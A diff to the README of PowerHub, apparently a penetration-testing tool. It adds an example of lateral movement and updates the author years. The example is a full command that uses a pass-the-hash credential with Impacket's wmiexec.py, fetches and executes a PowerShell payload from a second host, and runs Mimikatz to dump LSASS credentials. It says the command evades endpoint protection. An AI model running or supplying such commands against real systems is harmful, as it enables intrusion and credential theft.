@@ -49,10 +49,22 @@ the callback port or path differ from the default, it can also be changed.
 
 Read `./powerhub.py --help` for details.
 
+Example
+=======
+
+One nice application is, for example, the case where you have obtained some
+local administrator password hash and want to move laterally. This dumps the
+LSASS creds with Mimikatz via Impacket's `wmiexec.py`, tricking many
+endpoint protection tools:
+
+```
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:deadbeef0000000000000000deadbeef ./administrator@10.0.1.4  'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/ps\"); Load-Hubmodule 11 ; Invoke-Mimikatz "'
+```
+
 Author
 ======
 
-Adrian Vollmer, 2018
+Adrian Vollmer, 2018-2019
 
 License (MIT)
 ============
